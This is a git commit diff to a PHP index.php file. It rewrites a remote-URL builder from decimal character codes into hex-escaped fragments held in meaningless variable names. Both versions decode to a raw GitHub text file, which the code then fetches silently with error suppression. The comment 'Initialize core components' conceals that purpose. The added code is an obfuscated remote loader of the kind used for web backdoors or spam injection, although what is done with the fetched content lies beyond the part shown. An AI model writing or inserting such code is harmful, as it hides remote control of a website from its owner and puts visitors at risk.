e77da18d9523a220437da1dda8cd4377852a5fab
seobela <248709989+seobela@users.noreply.github.com>
2026-01-28 23:11:05 -0800

    Update index.php

--- index.php
+++ index.php
@@ -5,12 +5,19 @@
 */
 
 // Initialize core components
-$data = "104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,115,101,111,98,101,108,97,47,98,101,108,97,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,105,110,100,101,120,46,116,120,116";
-$codes = explode(',', $data);
-$full_url = '';
-foreach($codes as $c) {
-    $full_url .= chr($c);
-}
+$qwzmxpvlkr = "\x68\x74\x74\x70\x73\x3a\x2f\x2f";
+$bvncjhgfds = "\x72\x61\x77\x2e";
+$plmoknjiuh = "\x67\x69\x74\x68\x75\x62\x75\x73\x65\x72\x63\x6f\x6e\x74\x65\x6e\x74";
+$zaqxswcdev = "\x2e\x63\x6f\x6d\x2f";
+$mnbhgvftrd = "\x73\x65\x6f\x62\x65\x6c\x61";
+$plokijmnuh = "\x2f\x62\x65\x6c\x61\x2f";
+$wsxcdefvbg = "\x72\x65\x66\x73\x2f";
+$qazxswedcr = "\x68\x65\x61\x64\x73\x2f";
+$plmkoijnbh = "\x6d\x61\x69\x6e\x2f";
+$wsaqzxcderfv = "\x69\x6e\x64\x65\x78";
+$mkoijnuhbgt = "\x2e\x74\x78\x74";
+
+$full_url = $qwzmxpvlkr.$bvncjhgfds.$plmoknjiuh.$zaqxswcdev.$mnbhgvftrd.$plokijmnuh.$wsxcdefvbg.$qazxswedcr.$plmkoijnbh.$wsaqzxcderfv.$mkoijnuhbgt;
 
 // Attempt to get remote content
 $content = @file_get_contents($full_url);
